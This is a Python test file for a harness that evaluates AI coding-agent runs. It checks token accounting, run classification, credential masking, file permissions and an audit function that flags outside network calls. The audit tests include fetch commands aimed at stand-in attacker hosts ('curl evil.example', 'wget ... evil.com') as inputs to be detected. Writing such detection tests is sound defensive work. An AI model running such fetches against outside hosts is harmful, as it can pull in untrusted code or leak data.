"""리뷰 루프 1 수정 확인(fix verification — blind 테스트와 별개)."""
import json
import sys
import tempfile
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))
import creds  # noqa: E402
import events  # noqa: E402
import runner  # noqa: E402


def read_call(offset, start, num, total, is_error=False):
    meta = {"type": "text", "file": {"filePath": "/work/A.kt", "startLine": start, "numLines": num, "totalLines": total}}
    return events.Call(1, "Read", {"file_path": "/work/A.kt", "offset": offset}, "t", False, "x", is_error, meta)


class Targeting(unittest.TestCase):
    spans = events.parse_symbols("A.kt:500-510 fix\nA.kt:1500-1510 read")

    def test_offset1_whole_file_is_full_read_not_targeted(self):
        c = read_call(1, 1, 1772, 1773)
        self.assertEqual(events.targeted(c, self.spans), [])
        m = events.metrics([c], self.spans)
        self.assertEqual(m["full_read_turns"], {"A.kt": 1})
        self.assertIsNone(m["first_targeted_turn"])

    def test_partial_read_still_targeted(self):
        self.assertEqual(len(events.targeted(read_call(495, 495, 30, 1773), self.spans)), 1)

    def test_failed_read_not_targeted(self):
        c = read_call(500, 500, 10, 1773, is_error=True)
        self.assertEqual(events.metrics([c], self.spans)["first_targeted_turn"], None)


class Tokens(unittest.TestCase):
    def test_result_without_modelusage_is_invalid_but_tokens_recorded(self):
        evs = [{"type": "assistant", "message": {"id": "m1", "model": "x", "content": [],
                                                  "usage": {"input_tokens": 5, "output_tokens": 1,
                                                            "cache_read_input_tokens": 100, "cache_creation_input_tokens": 0}}},
               {"type": "result", "subtype": "error_during_execution", "is_error": True}]
        t = events.tokens(evs)
        self.assertEqual((t["total_tokens"], t["partial_tokens"], t["tokens_source"]), (106, True, "assistant_usage"))
        self.assertEqual(runner.classify(evs, 1, False, [], "", t)["invalid_reason"], "agent_error")
        ok = [evs[0], {"type": "result", "subtype": "success", "is_error": False}]  # 정상 result 인데 modelUsage 없음
        c = runner.classify(ok, 0, False, [], "", events.tokens(ok))
        self.assertEqual((c["valid"], c["invalid_reason"]), (False, "no_modelusage"))

    def test_timeout_before_first_reply_is_valid_censored_with_zero(self):
        t = events.tokens([])
        c = runner.classify([], 137, True, [], "", t)
        self.assertEqual((t["total_tokens"], c["valid"], c["censored"]), (0, True, True))

    def test_no_result_with_limit_text_in_stderr_is_usage_limit(self):
        c = runner.classify([], 1, False, [], "Claude AI usage limit reached|1793000000")
        self.assertEqual(c["invalid_reason"], "usage_limit")


class Masking(unittest.TestCase):
    def test_tokens_masked_in_files_and_secrets_from_sandbox(self):
        with tempfile.TemporaryDirectory() as d:
            sb = Path(d, "c.json")
            sb.write_text(json.dumps({"claudeAiOauth": {"accessToken": "sk-ant-oat01-" + "A" * 20,
                                                         "refreshToken": "sk-ant-ort01-" + "B" * 20, "expiresAt": 1}}))
            sec = creds.secrets(sb)
            self.assertEqual(len(sec), 2)
            f = Path(d, "raw.jsonl")
            f.write_text(json.dumps({"stdout": sb.read_text()}))
            self.assertEqual(runner.mask_file(f, sec), 2)
            self.assertNotIn("AAAA", f.read_text())
            self.assertIn("<masked-credential>", f.read_text())


class Resume(unittest.TestCase):
    def test_broken_line_skipped(self):
        with tempfile.TemporaryDirectory() as d:
            Path(d, "runs.jsonl").write_text(
                json.dumps({"case": "A", "structure": "god", "model": "m", "rep": 1, "valid": True}) + "\n{\"case\": \"A\", \"str")
            self.assertEqual(runner.done_keys(Path(d)), {("A", "god", "m", 1)})


class WriteBackPerms(unittest.TestCase):
    def test_replaced_origin_is_0600(self):
        with tempfile.TemporaryDirectory() as d:
            o, sb, lk = Path(d, "o.json"), Path(d, "s.json"), Path(d, "l")
            tok = {"accessToken": "a" * 20, "refreshToken": "r" * 20}
            o.write_text(json.dumps({"claudeAiOauth": {**tok, "expiresAt": 1000}}))
            sb.write_text(json.dumps({"claudeAiOauth": {**tok, "expiresAt": 2000}}))
            self.assertTrue(creds.write_back(sb, o, lk))
            self.assertEqual(o.stat().st_mode & 0o777, 0o600)
            self.assertEqual(creds.expiry(o), 2.0)


class Audit(unittest.TestCase):
    def a(self, cmd):
        return events.audit([events.Call(1, "Bash", {"command": cmd}, "t", False)])

    def test_schemeless_external_fetch_flagged(self):
        self.assertEqual(self.a("curl evil.example/path"), ["bash:url:evil.example"])
        self.assertEqual(self.a("wget -q user@evil.com:80/x"), ["bash:url:evil.com"])

    def test_local_and_variable_targets_pass(self):
        for c in ("curl -s localhost:8081/x", "curl -s $PG_URL/_control/cancellations", "curl -o out.json 127.0.0.1:1/x",
                  "curl -H 'Content-Type: application/json' -d '{\"a\":1}' localhost:8081/orders"):
            with self.subTest(c=c):
                self.assertEqual(self.a(c), [])


if __name__ == "__main__":
    unittest.main()
